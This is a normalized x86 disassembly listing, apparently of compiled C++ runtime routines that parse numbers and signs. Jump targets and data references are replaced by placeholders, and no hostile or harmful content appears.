lea ecx [ esp + 0x38 ]
cmp [ esp + 0x18 ] ecx
je r-xdata
or [ eax ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x28 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ eax ] 0x2
cmp [ esp + 0x14 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov eax [ esp + 0x1c ]
mov edx [ esp + 0x30 ]
mov [ eax ] ebx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_10010ca0
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx ecx
mov ecx [ ebp + 0x24 ]
push ebx
mov ebx [ ebp + 0x20 ]
push esi
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x4c ]
push ecx
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x1c ]
lea ecx [ ebp - 0x44 ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
xor esi esi
push ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x44 ] esi
call sub_10011810
add esp 0x10
push eax
lea edx [ ebp - 0x50 ]
push edx
lea eax [ ebp - 0x40 ]
push eax
call sub_1001692d
fstp [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
add esp 0x10
cmp eax esi
je r-xdata
push edi
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_10013d60
pop edi
test al al
je r-xdata
fld [ ebp - 0x48 ]
lea ecx [ eax * 4 ]
push ecx
sub esp 0x8
fstp [ esp ]
call sub_100179c8
fstp [ ebp - 0x44 ]
add esp 0xc
fld [ ebp - 0x44 ]
fstp [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] edx
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
fld [ ebp - 0x48 ]
mov eax [ ebp - 0x58 ]
fstp [ eax ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x54 ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
mov [ eax + 0x4 ] edx
pop ebx
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_10010d80
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0x74
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x70 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x20 ]
push esi
mov edx ecx
mov ecx [ ebp + 0x24 ]
push edi
mov [ esp + 0x2c ] ecx
lea ecx [ esp + 0x28 ]
push ecx
push ecx
mov [ esp + 0x38 ] eax
mov eax [ ebp + 0x1c ]
lea ecx [ esp + 0x2c ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
xor esi esi
push ecx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x40 ] esi
mov [ esp + 0x3c ] esi
call sub_10011810
add esp 0x14
push eax
lea edx [ esp + 0x3c ]
push edx
lea eax [ esp + 0x4c ]
push eax
call sub_10016dbd
fst [ esp + 0x48 ]
mov eax [ esp + 0x34 ]
add esp 0x10
cmp eax esi
je r-xdata
fstp st0
lea ecx [ eax * 4 ]
push ecx
sub esp 0x8
fstp [ esp ]
call sub_100179c8
fstp [ esp + 0x44 ]
add esp 0xc
jmp r-xdata
lea edx [ esp + 0x40 ]
cmp [ esp + 0x34 ] edx
je r-xdata
or [ ebx ] 0x1
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_10013d60
test al al
je r-xdata
or [ ebx ] 0x2
cmp [ esp + 0x28 ] 0x0
jne r-xdata
fld [ esp + 0x38 ]
mov eax [ esp + 0x2c ]
fstp [ eax ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ esp + 0x30 ]
mov edx [ ebp + 0x10 ]
pop edi
mov [ eax ] ecx
mov ecx [ esp + 0x78 ]
pop esi
pop ebx
xor ecx esp
mov [ eax + 0x4 ] edx
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_10010e70
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0x74
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x70 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x20 ]
push esi
mov edx ecx
mov ecx [ ebp + 0x24 ]
push edi
mov [ esp + 0x2c ] ecx
lea ecx [ esp + 0x28 ]
push ecx
push ecx
mov [ esp + 0x38 ] eax
mov eax [ ebp + 0x1c ]
lea ecx [ esp + 0x2c ]
push ecx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
xor esi esi
push ecx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x40 ] esi
mov [ esp + 0x3c ] esi
call sub_10011810
add esp 0x14
push eax
lea edx [ esp + 0x3c ]
push edx
lea eax [ esp + 0x4c ]
push eax
call sub_10016c16
fst [ esp + 0x48 ]
mov eax [ esp + 0x34 ]
add esp 0x10
cmp eax esi
je r-xdata
fstp st0
lea ecx [ eax * 4 ]
push ecx
sub esp 0x8
fstp [ esp ]
call sub_100179c8
fstp [ esp + 0x44 ]
add esp 0xc
jmp r-xdata
lea edx [ esp + 0x40 ]
cmp [ esp + 0x34 ] edx
je r-xdata
or [ ebx ] 0x1
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_10013d60
test al al
je r-xdata
or [ ebx ] 0x2
cmp [ esp + 0x28 ] 0x0
jne r-xdata
fld [ esp + 0x38 ]
mov eax [ esp + 0x2c ]
fstp [ eax ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ esp + 0x30 ]
mov edx [ ebp + 0x10 ]
pop edi
mov [ eax ] ecx
mov ecx [ esp + 0x78 ]
pop esi
pop ebx
xor ecx esp
mov [ eax + 0x4 ] edx
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_10010f60
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10028828
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x20 ]
mov esi ecx
mov ecx [ ebp + 0x24 ]
mov [ esp + 0x28 ] eax
mov eax [ ebp + 0x1c ]
lea edi [ esp + 0x24 ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0x10 ] 0x0
call sub_100034b0
push eax
push 0x800
lea edx [ ebp + 0xc ]
push edx
push esi
lea edx [ ebp + 0x14 ]
lea ecx [ esp + 0x40 ]
mov [ esp + 0x70 ] 0x0
call sub_10011200
mov [ esp + 0x24 ] eax
mov [ esp + 0x70 ] 0xffffffff
mov eax [ esp + 0x34 ]
add esp 0x10
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x10 ]
push eax
push ecx
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x3c ]
push eax
call sub_10016c21
add esp 0x10
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
call sub_10013d60
test al al
je r-xdata
push 0x0
lea ecx [ esp + 0x30 ]
mov edi eax
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x30 ]
cmp [ esp + 0x1c ] ecx
je r-xdata
or [ ebx ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x2c ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ ebx ] 0x2
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x20 ]
mov [ eax ] edx
jmp r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0x20
sub_100110c0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
cmp [ esi + 0x14 ] 0x1
jae r-xdata
mov ecx 0x8
cmp [ esi + 0x14 ] ecx
jb r-xdata
mov ecx [ esi + 0x10 ]
push ecx
push 0x1
push esi
call sub_100022f0
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
mov [ eax + 0x2 ] cx
retn
mov eax [ esi ]
xor ecx ecx
mov [ eax + 0x2 ] cx
mov eax esi
retn
xor edx edx
mov [ eax ] dx
mov [ esi + 0x10 ] 0x1
cmp [ esi + 0x14 ] ecx
jb r-xdata
sub_10011120
push ebp
mov ebp esp
push 0xffffffff
push sub_100290e0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x7ffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x5
cmp eax edi
jae r-xdata
push r--data
call sub_10015cff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_10012680
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push ebx
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_10013e10
mov ecx [ esi + 0x4 ]
mov eax [ esi ]
mov ebx ecx
add esp 0xc
sub ebx eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl edi 0x5
add edi eax
and ebx 0xffffffe0
add ebx eax
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ebx
mov [ esi ] eax
mov edi ecx
call sub_10013c60
mov ecx [ esi ]
push ecx
call sub_100173b1
mov edi [ ebp + 0x8 ]
add esp 0x4
sub_10011200
push ebp
mov ebp esp
push 0xffffffff
push sub_100287f0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] edx
call sub_10007de0
mov edi eax
lea esi [ ebp - 0x48 ]
mov ecx edi
call sub_10007530
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x8 ]
mov ecx edi
call edx
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x10 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
xor eax eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x68 ]
add eax 0x8
push eax
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
lea edx [ ebp - 0x4c ]
mov [ ebp - 0x68 ] eax
push edx
lea eax [ ebp - 0x64 ]
push eax
mov [ ebp - 0x4c ] 0x30
call sub_10016639
mov ecx [ ebp - 0x70 ]
mov edi [ ebp - 0x6c ]
add esp 0x14
mov esi ebx
mov [ ebp - 0x60 ] ecx
call sub_10013d60
test al al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x5c ] 0x8
jmp r-xdata
mov edi [ ebp - 0x68 ]
movzx esi [ ebx + 0x6 ]
push edi
xor eax eax
lea edx [ ebp - 0x5c ]
push edx
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x5c ] eax
push 0x1
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x54 ]
push ecx
mov [ ebp - 0x4c ] 0x2b
call sub_10016639
add esp 0x14
cmp si [ ebp - 0x54 ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x5c ] 0x10
jmp r-xdata
mov edi [ ebp - 0x6c ]
mov esi ebx
mov [ ebp - 0x4d ] 0x0
mov [ ebp - 0x55 ] 0x0
call sub_10013d60
test al al
jne r-xdata
push edi
xor eax eax
lea edx [ ebp - 0x5c ]
push edx
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x5c ] eax
push 0x1
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x54 ]
push ecx
mov [ ebp - 0x4c ] 0x2d
call sub_10016639
movzx edi [ ebp - 0x54 ]
add esp 0x14
mov esi ebx
call sub_10013700
cmp ax di
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2b
jmp r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2d
inc eax
mov esi ebx
mov [ ebp - 0x60 ] eax
call sub_10013760
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov [ ebp - 0x64 ] 0xa
cmp [ ebp - 0x5c ] 0xa
je r-xdata
movzx eax [ ebx + 0x6 ]
cmp ax [ ebp - 0x64 ]
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
mov edi edi
mov eax [ ebp - 0x5c ]
sub eax 0x8
neg eax
sbb eax eax
and eax 0xe
add eax 0x8
mov [ ebp - 0x64 ] eax
jmp r-xdata
mov esi ebx
mov [ ebp - 0x4d ] 0x1
call sub_10013760
call sub_10013d60
test al al
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp - 0x4d ] 0x0
mov ebx [ ebp - 0x2c ]
mov edi [ ebp - 0x18 ]
je r-xdata
lea esi [ ebp - 0x48 ]
mov edx [ ebp - 0x68 ]
movzx ecx [ ebx + 0x6 ]
push edx
lea eax [ ebp - 0x78 ]
push eax
push ecx
lea edx [ ebp - 0x4c ]
push edx
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x78 ] 0x0
call sub_10015dc5
mov al [ ebp - 0x4c ]
mov ecx [ ebp - 0x64 ]
mov esi [ ebp - 0x60 ]
movsx edx al
push ecx
push edx
push r--data
mov [ esi ] al
call sub_100175c0
add esp 0x1c
test eax eax
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov cl [ ebp - 0x4d ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] cl
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x2b ] 0x0
mov edi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
mov esi ebx
mov [ ebp - 0x54 ] 0x0
call sub_10013d60
test al al
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
mov edx [ ebp - 0x68 ]
xor eax eax
push edx
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x54 ]
push eax
push 0x1
lea ecx [ ebp - 0x4c ]
push ecx
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x4c ] 0x78
call sub_10016639
movzx edi [ ebp - 0x64 ]
add esp 0x14
call sub_10013700
cmp ax di
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x18 ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax [ ebp - 0x70 ]
mov edx [ ebp - 0x54 ]
mov edi [ ebp - 0x18 ]
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
cmp [ ebp - 0x55 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebp - 0x5c ] 0x8
jmp r-xdata
mov eax [ ebp - 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x68 ]
push eax
push 0x58
call sub_10005560
add esp 0x8
mov di ax
call sub_10013700
cmp ax di
jne r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
push ebx
call sub_100173b1
add esp 0x4
cmp [ ebp - 0x55 ] 0x0
mov eax [ ebp - 0x60 ]
jne r-xdata
mov cl [ esi ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x54 ]
cmp [ eax + ecx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp - 0x70 ]
add eax 0x1f
cmp esi eax
jae r-xdata
cmp [ esi ] 0x30
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
mov esi ebx
mov [ ebp - 0x5c ] 0x10
mov [ ebp - 0x4d ] 0x0
call sub_10013760
jmp r-xdata
cmp eax 0x10
jne r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x48 ]
push eax
call sub_100173b1
add esp 0x4
mov [ eax ] 0x0
cmp edi 0x10
jb r-xdata
mov [ eax ] 0x30
inc eax
jmp r-xdata
dec edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov esi [ ebp - 0x74 ]
test si si
je r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x4d ] 0x1
mov eax edi
cmp edx 0x10
jae r-xdata
inc esi
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x55 ] 0x1
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
test edx edx
jne r-xdata
mov eax ebx
cmp edi 0x10
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x54 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ esi + 0x1 ] 0x0
jle r-xdata
mov eax ebx
cmp edi 0x10
jae r-xdata
cmp cl [ eax + edx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x54 ]
cmp [ eax + edx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebx + 0x6 ] si
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov eax edi
cmp edx 0x10
jae r-xdata
test edx edx
je r-xdata
inc esi
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4d ] 0x0
inc [ ebp - 0x54 ]
jmp r-xdata
mov ecx [ ebp - 0x1c ]
or edx 0xffffffff
sub edx ecx
cmp edx 0x1
jbe r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov [ ebx ] 0x0
mov [ ebx + 0x4 ] 0x1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push r--data
call sub_10015cff
lea esi [ ecx + 0x1 ]
cmp esi 0xfffffffe
ja r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x18 ]
call eax
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp [ ebx + 0x4 ] 0x0
mov edi [ ebp - 0x2c ]
jne r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x1c ]
call edx
movzx eax ax
mov edx [ ecx + 0x30 ]
cmp [ edx ] 0x0
jle r-xdata
cmp edi esi
jae r-xdata
mov [ ebx + 0x6 ] ax
jmp r-xdata
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ebx + 0x4 ] 0x0
jmp r-xdata
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
movzx eax [ eax ]
jmp r-xdata
test esi esi
jne r-xdata
push ecx
push esi
lea ecx [ ebp - 0x2c ]
call sub_100024e0
mov edi [ ebp - 0x18 ]
mov ecx [ ebp - 0x1c ]
test esi esi
je r-xdata
mov [ ebx + 0x4 ] 0x1
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov edi [ ebp - 0x6c ]
mov esi ebx
call sub_10013d60
test al al
je r-xdata
mov ecx 0xffff
cmp cx ax
je r-xdata
mov eax [ ebp - 0x2c ]
cmp edi 0x10
jae r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1c ] esi
cmp edi 0x10
jae r-xdata
inc [ ebp - 0x54 ]
mov [ ecx + eax ] 0x0
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x1c ] esi
jae r-xdata
lea eax [ ebp - 0x2c ]
mov [ eax ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov [ esi + eax ] 0x0
lea eax [ ebp - 0x2c ]
sub_10011810
push ebp
mov ebp esp
push 0xffffffff
push sub_100287ab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x10 ]
mov esi [ eax + 0x14 ]
and esi 0x3000
mov [ ebp - 0x7c ] edx
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x78 ] ebx
cmp esi 0x3000
jne r-xdata
lea edi [ ebp - 0x84 ]
call sub_100034b0
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_10007de0
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x84 ]
mov [ ebp - 0x5c ] eax
test edi edi
je r-xdata
push edi
push eax
push ebx
push edx
mov edx [ ebp - 0x64 ]
call sub_100126d0
add esp 0x10
jmp r-xdata
mov ecx [ ebp - 0x5c ]
lea esi [ ebp - 0x48 ]
call sub_10007530
xor eax eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x7c ]
add eax 0x8
push eax
lea ecx [ ebp - 0x70 ]
push ecx
push 0x1
lea edx [ ebp - 0x54 ]
mov [ ebp - 0x7c ] eax
push edx
lea eax [ ebp - 0x60 ]
push eax
mov [ ebp - 0x54 ] 0x30
call sub_10016639
mov ecx [ ebp - 0x80 ]
mov edi [ ebp - 0x64 ]
add esp 0x14
mov esi ebx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x54 ] 0x0
call sub_10013d60
test al al
jne r-xdata
push 0x0
lea ecx [ ebp - 0x70 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x48 ]
xor esi esi
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x74 ] esi
mov eax edx
cmp ecx 0x10
jae r-xdata
mov edx [ ebp - 0x7c ]
xor eax eax
push edx
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x68 ]
push eax
push 0x1
lea ecx [ ebp - 0x4c ]
push ecx
lea edx [ ebp - 0x70 ]
push edx
mov [ ebp - 0x4c ] 0x2b
call sub_10016639
movzx edi [ ebp - 0x70 ]
add esp 0x14
call sub_10013700
cmp ax di
jne r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x70 ]
not esi
call sub_100163e1
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
xor eax eax
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0x68 ]
push ecx
push 0x1
lea edx [ ebp - 0x4c ]
push edx
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x4c ] 0x2d
call sub_10016639
movzx edi [ ebp - 0x70 ]
add esp 0x14
mov esi ebx
call sub_10013700
cmp ax di
jne r-xdata
mov eax [ ebp - 0x80 ]
mov [ eax ] 0x2b
jmp r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov eax [ ebp - 0x80 ]
mov [ eax ] 0x2d
inc eax
mov esi ebx
mov [ ebp - 0x58 ] eax
call sub_10013760
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x6c ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] al
jne r-xdata
mov dx [ ebp - 0x60 ]
cmp dx [ ebx + 0x6 ]
ja r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
mov edi [ ebp - 0x64 ]
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
mov esi ebx
call sub_10013d60
test al al
jne r-xdata
mov ecx [ ebp - 0x5c ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
movzx esi [ ebx + 0x6 ]
call eax
cmp si ax
jne r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
mov ecx [ ebp - 0x5c ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
movzx ecx ax
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x70 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov edx [ ebp - 0x6c ]
mov [ ebp - 0x5c ] edx
cmp [ ebp - 0x74 ] 0x0
jge r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call sub_1001766d
mov ecx [ eax ]
mov eax [ ebp - 0x58 ]
mov dl [ ecx ]
mov [ eax ] dl
mov ecx [ ebx ]
inc eax
mov [ ebp - 0x58 ] eax
test ecx ecx
je r-xdata
mov [ ebx ] 0x0
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
